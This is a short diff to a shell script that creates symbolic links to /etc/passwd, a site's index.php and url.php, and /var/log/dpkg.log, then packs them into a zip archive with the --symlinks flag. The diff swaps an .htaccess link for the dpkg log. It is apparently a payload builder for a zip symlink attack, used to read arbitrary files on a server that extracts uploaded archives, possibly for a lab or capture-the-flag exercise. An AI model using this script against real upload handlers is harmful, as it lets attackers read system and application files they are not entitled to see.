@@ -10,10 +10,10 @@ done
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
 ln -s ../../url.php url
-ln -s ../../.htaccess htaccess
+ln -s /var/log/dpkg.log dpkglog
 
 # zip stuff
-zip --symlinks cmd.zip testfile.txt passwd index url htaccess
+zip --symlinks cmd.zip testfile.txt passwd index url dpkglog
 
 # cleanup
-rm passwd index url htaccess testfile.txt
+rm passwd index url dpkglog testfile.txt
